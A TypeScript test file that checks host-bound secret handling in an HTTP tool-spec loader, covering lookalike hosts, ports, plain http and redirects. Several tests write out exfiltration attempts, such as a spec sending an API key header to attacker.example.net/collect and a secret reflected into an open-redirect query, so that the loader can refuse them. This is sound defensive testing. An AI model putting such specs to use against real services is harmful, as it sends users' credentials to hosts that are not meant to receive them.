import { createApp, InMemoryToolRegistry, silentLogger, type ToolContext } from "@kervan/core"
import { createTestClient } from "@kervan/transport/testing"
import type { Client } from "@modelcontextprotocol/client"
import { afterAll, afterEach, beforeAll, describe, expect, it } from "vitest"
import { compilePlan } from "../src/compile.js"
import {
  applySpec,
  httpTool,
  loadSpec,
  type NetworkPolicy,
  type SecretContext,
  type SecretSource,
  SecretVault,
  SpecLoadError,
} from "../src/index.js"
import { planTool } from "../src/plan.js"
import { startUpstream, type Upstream } from "./upstream.js"

const SECRET = "sk-bound-0123456789"
let upstream: Upstream
let other: Upstream
let port: string
let otherPort: string
beforeAll(async () => {
  upstream = await startUpstream()
  other = await startUpstream()
  port = new URL(upstream.url).port
  otherPort = new URL(other.url).port
})
afterAll(async () => {
  await upstream.close()
  await other.close()
})

const clients: Client[] = []
afterEach(async () => {
  await Promise.all(clients.splice(0).map((client) => client.close()))
})

/** Every host name resolves to the local test APIs, which the policy then allows. */
const network: NetworkPolicy = {
  allowPrivate: ["127.0.0.1/32"],
  resolve: async () => [{ address: "127.0.0.1", family: 4 }],
}

/** A source that records what it was asked and only answers for `allowed` host:port pairs. */
function recordingSource(allowed?: readonly string[]) {
  const asked: (SecretContext | undefined)[] = []
  const source: SecretSource = {
    get(name, context) {
      asked.push(context)
      if (name !== "API_KEY") return undefined
      if (allowed && (!context || !allowed.includes(context.host))) return undefined
      return SECRET
    },
  }
  return { source, asked }
}

const specText = (secrets: string, tools: string) =>
  `specVersion: 1
name: binding-test
version: 0.0.0
secrets: ${secrets}
defaults: { http: { allowInsecureHttp: true, timeoutMs: 2000 } }
tools:
${tools}`
    .replaceAll("OTHERPORT", otherPort)
    .replaceAll("PORT", port)

const keyTool = (url: string, header = 'headers: { X-Key: "{{secrets.API_KEY}}" }') => `
  - name: call
    description: Sends the key
    http:
      url: ${url}
      ${header}
    output: { select: "@" }`

/** Load errors; the local test APIs speak http, so tests opt in to secrets over http. */
async function loadErrors(
  text: string,
  source: SecretSource = recordingSource().source,
  allowSecretsOverHttp = true,
) {
  try {
    await loadSpec(text, { secrets: source, network, allowSecretsOverHttp })
  } catch (error) {
    if (error instanceof SpecLoadError) return error.issues.map((issue) => issue.message)
    throw error
  }
  return []
}

async function serve(text: string, source: SecretSource) {
  const loaded = await loadSpec(text, { secrets: source, network, allowSecretsOverHttp: true })
  const app = createApp({ name: "binding", version: "0.0.0", logger: silentLogger })
  applySpec(app.registry, loaded)
  const client = await createTestClient(app)
  clients.push(client)
  return client
}

const resultText = (result: unknown) =>
  (result as { content: { text?: string }[] }).content.map((block) => block.text ?? "").join("")

const requestsTo = (prefix: string) =>
  upstream.requests.filter((request) => request.path.startsWith(prefix))

const ctx = () => ({ signal: new AbortController().signal }) as unknown as ToolContext

describe("secret bindings at load time", () => {
  it("accepts a bound secret sent to one of its hosts", async () => {
    const text = specText(
      "[{ name: API_KEY, hosts: [api.example.com] }]",
      keyTool("https://api.example.com/v1"),
    )
    expect(await loadErrors(text)).toEqual([])
  })

  it("refuses a spec that sends a bound secret to its own host (exfiltration)", async () => {
    // A member who can edit the spec but not the secret points a tool at a host they control.
    const text = specText(
      "[{ name: API_KEY, hosts: [api.example.com] }]",
      keyTool("https://attacker.example.net/collect"),
    )
    expect(await loadErrors(text)).toContain(
      "Secret API_KEY may only be sent to api.example.com:443; this tool calls attacker.example.net:443.",
    )
  })

  it.each([
    ["a parent domain does not cover subdomains", "example.com", "https://api.example.com/"],
    ["a suffix match is not enough", "api.example.com", "https://api.example.com.evil.net/"],
    ["a prefix match is not enough", "api.example.com", "https://evilapi.example.com/"],
    ["an IP is not its host name", "api.example.com", "https://203.0.113.7/"],
    ["a trailing dot is a different name", "api.example.com", "https://api.example.com./"],
    ["another port than the default", "api.example.com", "https://api.example.com:8443/"],
    ["the default port when another is bound", "api.example.com:8443", "https://api.example.com/"],
    ["a neighbouring port", "api.example.com:8443", "https://api.example.com:8444/"],
  ])("matches host and port exactly: %s", async (_name, host, url) => {
    const text = specText(`[{ name: API_KEY, hosts: ["${host}"] }]`, keyTool(url))
    const errors = await loadErrors(text)
    expect(errors.some((message) => message.startsWith("Secret API_KEY may only be sent"))).toBe(
      true,
    )
  })

  it("compares normalized values: case does not matter, a missing port means 443", async () => {
    const text = (hosts: string, url: string) =>
      specText(`[{ name: API_KEY, hosts: ["${hosts}"] }]`, keyTool(url))
    expect(await loadErrors(text("API.Example.COM", "https://api.example.com/v1"))).toEqual([])
    expect(await loadErrors(text("api.example.com:443", "https://api.example.com/"))).toEqual([])
    expect(await loadErrors(text("api.example.com:8443", "https://api.example.com:8443/"))).toEqual(
      [],
    )
  })

  it.each([
    ["an empty list", "[]"],
    ["a wildcard", "['*.example.com']"],
    ["a URL", "['https://api.example.com']"],
    ["a port out of range", "['api.example.com:65536']"],
    ["a path", "['api.example.com/v1']"],
    ["an empty name", "['']"],
  ])("refuses %s as hosts", async (_name, hosts) => {
    const text = specText(
      `[{ name: API_KEY, hosts: ${hosts} }]`,
      keyTool("https://api.example.com/"),
    )
    expect(await loadErrors(text)).not.toEqual([])
  })

  it("refuses a secret declared twice", async () => {
    const text = specText(
      "[API_KEY, { name: API_KEY, hosts: [api.example.com] }]",
      keyTool("https://api.example.com/"),
    )
    expect(await loadErrors(text)).toContain("Secret API_KEY is declared twice.")
  })

  it("asks the source with the host:port and tool, once per host", async () => {
    const { source, asked } = recordingSource()
    const text = specText(
      "[API_KEY]",
      `${keyTool("https://api.example.com/a")}
  - name: second
    description: Same host
    http: { url: "https://api.example.com/b", headers: { X-Key: "{{secrets.API_KEY}}" } }
    output: { select: "@" }`,
    )
    await loadSpec(text, { secrets: source, network })
    expect(asked).toEqual([{ host: "api.example.com:443", tool: "call" }])
  })

  it("warns when the source refuses the tool's host, and fails with requireSecrets", async () => {
    const { source } = recordingSource(["other.example.com:443"])
    const text = specText("[API_KEY]", keyTool("https://api.example.com/"))
    const message =
      "Secret API_KEY is not set or not allowed for api.example.com:443; tools that use it there fail until it is."
    const loaded = await loadSpec(text, { secrets: source, network })
    expect(loaded.warnings.map((warning) => warning.message)).toContain(message)
    await expect(
      loadSpec(text, { secrets: source, network, requireSecrets: true }),
    ).rejects.toMatchObject({ issues: [expect.objectContaining({ message })] })
  })

  it("treats a binding change as a tool change", async () => {
    const { source } = recordingSource()
    const one = await loadSpec(
      specText(
        "[{ name: API_KEY, hosts: [api.example.com] }]",
        keyTool("https://api.example.com/"),
      ),
      { secrets: source, network },
    )
    const two = await loadSpec(
      specText(
        "[{ name: API_KEY, hosts: [api.example.com, b.example.com] }]",
        keyTool("https://api.example.com/"),
      ),
      { secrets: source, network },
    )
    expect(one.tools[0]?.signature).not.toBe(two.tools[0]?.signature)
    const registry = new InMemoryToolRegistry()
    const first = applySpec(registry, one)
    const before = registry.list()[0]
    applySpec(registry, two, first)
    expect(registry.list()[0]).not.toBe(before)
  })

  it("httpTool takes bindings too", () => {
    expect(() =>
      httpTool(
        {
          name: "t",
          description: "d",
          http: { url: "https://evil.example.net/", headers: { "X-Key": "{{secrets.API_KEY}}" } },
          output: { select: "@" },
        },
        { secretNames: [{ name: "API_KEY", hosts: ["api.example.com"] }] },
      ),
    ).toThrow(/may only be sent to api.example.com:443/)
    expect(() =>
      httpTool(
        { name: "t", description: "d", http: { url: "https://x.example/" }, output: { raw: true } },
        { secretNames: [{ name: "API_KEY", hosts: ["*.example.com"] }] },
      ),
    ).toThrow(/is not a host name/)
  })
})

describe("secrets never travel over plain http", () => {
  it("refuses a tool that sends a secret to an http URL, even with allowInsecureHttp", async () => {
    const text = specText("[API_KEY]", keyTool("http://api.example.com/v1"))
    expect(await loadErrors(text, recordingSource().source, false)).toContain(
      "This tool sends secrets, so its URL must use https: secrets are never sent over plain http.",
    )
  })

  it("allows plain http for tools without secrets, and with the development opt-in", async () => {
    const noSecrets = specText("[]", keyTool("http://api.example.com/v1", ""))
    expect(await loadErrors(noSecrets, recordingSource().source, false)).toEqual([])
    const withSecrets = specText("[API_KEY]", keyTool("http://api.example.com/v1"))
    expect(await loadErrors(withSecrets, recordingSource().source, true)).toEqual([])
  })

  it("refuses at send time too, independently of loading", async () => {
    const tool = {
      name: "call",
      description: "d",
      http: {
        method: "GET" as const,
        url: `http://bound.test:${port}/echo/plaintext`,
        headers: { "X-Key": "{{secrets.API_KEY}}" },
        allowInsecureHttp: true,
      },
      output: { select: "@" },
    }
    // Planned with the opt-in, run without it.
    const plan = planTool(tool, undefined, undefined, [], () => {}, { allowSecretsOverHttp: true })
    if (!plan) throw new Error("expected a plan")
    const definition = compilePlan(plan, {
      secrets: recordingSource().source,
      vault: new SecretVault(),
      network,
    })
    await expect(definition.handler({}, ctx())).rejects.toThrow(/never travel over plain http/)
    expect(requestsTo("/echo/plaintext")).toEqual([])
  })
})

describe("secret bindings at call time", () => {
  it("sends nothing when the source refuses the host", async () => {
    // The source binds API_KEY to another host; the spec itself does not restrict it.
    const { source, asked } = recordingSource(["api.example.com:443"])
    const client = await serve(
      specText("[API_KEY]", keyTool("http://bound.test:PORT/echo/refused")),
      source,
    )
    const result = await client.callTool({ name: "call", arguments: {} })
    expect(result.isError).toBe(true)
    expect(resultText(result)).toBe(
      `Secret API_KEY is not set or not allowed for bound.test:${port}.`,
    )
    expect(requestsTo("/echo/refused")).toEqual([])
    expect(asked.at(-1)).toEqual({ host: `bound.test:${port}`, tool: "call" })
  })

  it("sends nothing to another port of a bound host", async () => {
    // The source allows bound.test on the API's port only; the spec targets another port.
    const { source } = recordingSource([`bound.test:${port}`])
    const client = await serve(
      specText("[API_KEY]", keyTool("http://bound.test:OTHERPORT/echo/other-port")),
      source,
    )
    const result = await client.callTool({ name: "call", arguments: {} })
    expect(resultText(result)).toBe(
      `Secret API_KEY is not set or not allowed for bound.test:${otherPort}.`,
    )
    expect(other.requests).toEqual([])
  })

  it("re-checks the spec binding before sending, independently of loading", async () => {
    // Plan a tool whose binding allows its host, then narrow the binding after planning: the
    // executor must refuse on its own, not rely on the load-time check.
    const tool = {
      name: "call",
      description: "d",
      http: {
        method: "GET" as const,
        url: `http://bound.test:${port}/echo/runtime`,
        headers: { "X-Key": "{{secrets.API_KEY}}" },
        allowInsecureHttp: true,
      },
      output: { select: "@" },
    }
    const declared = new Map([["API_KEY", [`bound.test:${port}`]]])
    const plan = planTool(tool, undefined, declared, [], () => {}, { allowSecretsOverHttp: true })
    if (!plan) throw new Error("expected a plan")
    const narrowed = { ...plan, secretHosts: new Map([["API_KEY", ["api.example.com:443"]]]) }
    const definition = compilePlan(narrowed, {
      secrets: recordingSource().source,
      vault: new SecretVault(),
      network,
      allowSecretsOverHttp: true,
    })
    await expect(definition.handler({}, ctx())).rejects.toThrow(
      `Secret API_KEY may not be sent to bound.test:${port}.`,
    )
    expect(requestsTo("/echo/runtime")).toEqual([])
  })

  it("sends the secret to a bound host and port", async () => {
    const { source } = recordingSource([`bound.test:${port}`])
    const client = await serve(
      specText(
        "[{ name: API_KEY, hosts: ['bound.test:PORT'] }]",
        keyTool("http://bound.test:PORT/echo/ok"),
      ),
      source,
    )
    const result = await client.callTool({ name: "call", arguments: {} })
    expect(result.isError).toBeFalsy()
    expect(requestsTo("/echo/ok").at(-1)?.headers["x-key"]).toBe(SECRET)
  })
})

describe("secret bindings and redirects", () => {
  const redirecting = (location: string, header = "X-Key") => `
  - name: call
    description: Follows one redirect
    http:
      url: http://bound.test:PORT/redirect-to
      query: { to: "${location}" }
      headers: { ${header}: "{{secrets.API_KEY}}" }
      followRedirects: 1
    output: { select: "@" }`

  it("refuses a redirect to a host outside the spec binding", async () => {
    const client = await serve(
      specText(
        "[{ name: API_KEY, hosts: ['bound.test:PORT'] }]",
        redirecting("http://elsewhere.test:PORT/echo/spec-bound"),
      ),
      recordingSource().source,
    )
    const result = await client.callTool({ name: "call", arguments: {} })
    expect(resultText(result)).toMatch(
      /redirected to a host that may not receive this tool's secrets/,
    )
    expect(requestsTo("/echo/spec-bound")).toEqual([])
  })

  it("refuses a redirect to a host the source does not allow", async () => {
    const client = await serve(
      specText("[API_KEY]", redirecting("http://elsewhere.test:PORT/echo/source-bound")),
      recordingSource([`bound.test:${port}`]).source,
    )
    const result = await client.callTool({ name: "call", arguments: {} })
    expect(resultText(result)).toMatch(/may not receive this tool's secrets/)
    expect(requestsTo("/echo/source-bound")).toEqual([])
  })

  it("refuses a redirect to another port of the same host", async () => {
    const client = await serve(
      specText(
        "[{ name: API_KEY, hosts: ['bound.test:PORT'] }]",
        redirecting("http://bound.test:OTHERPORT/echo/port-hop"),
      ),
      recordingSource().source,
    )
    const result = await client.callTool({ name: "call", arguments: {} })
    expect(resultText(result)).toMatch(/may not receive this tool's secrets/)
    expect(other.requests).toEqual([])
  })

  it("does not carry a secret reflected into the redirect URL (open redirect)", async () => {
    // The bound host has an open redirect; the spec puts the secret into the redirect target.
    const client = await serve(
      specText(
        "[{ name: API_KEY, hosts: ['bound.test:PORT'] }]",
        redirecting("http://elsewhere.test:PORT/echo/reflected?k={{secrets.API_KEY}}"),
      ),
      recordingSource().source,
    )
    await client.callTool({ name: "call", arguments: {} })
    expect(requestsTo("/echo/reflected")).toEqual([])
  })

  it("follows a redirect to another allowed host, without the spec's headers", async () => {
    const client = await serve(
      specText(
        "[{ name: API_KEY, hosts: ['bound.test:PORT', 'elsewhere.test:PORT'] }]",
        redirecting("http://elsewhere.test:PORT/echo/allowed"),
      ),
      recordingSource([`bound.test:${port}`, `elsewhere.test:${port}`]).source,
    )
    const result = await client.callTool({ name: "call", arguments: {} })
    expect(result.isError).toBeFalsy()
    const landed = requestsTo("/echo/allowed").at(-1)
    expect(landed).toBeDefined()
    expect(landed?.headers["x-key"]).toBeUndefined()
  })

  it("drops a kept header that carries a secret when the origin changes", async () => {
    // User-Agent normally survives a cross-origin redirect; not when it holds a secret.
    const client = await serve(
      specText("[API_KEY]", redirecting("http://elsewhere.test:PORT/echo/agent", "User-Agent")),
      recordingSource().source,
    )
    await client.callTool({ name: "call", arguments: {} })
    const landed = requestsTo("/echo/agent").at(-1)
    expect(landed).toBeDefined()
    expect(landed?.headers["user-agent"]).not.toBe(SECRET)
  })
})
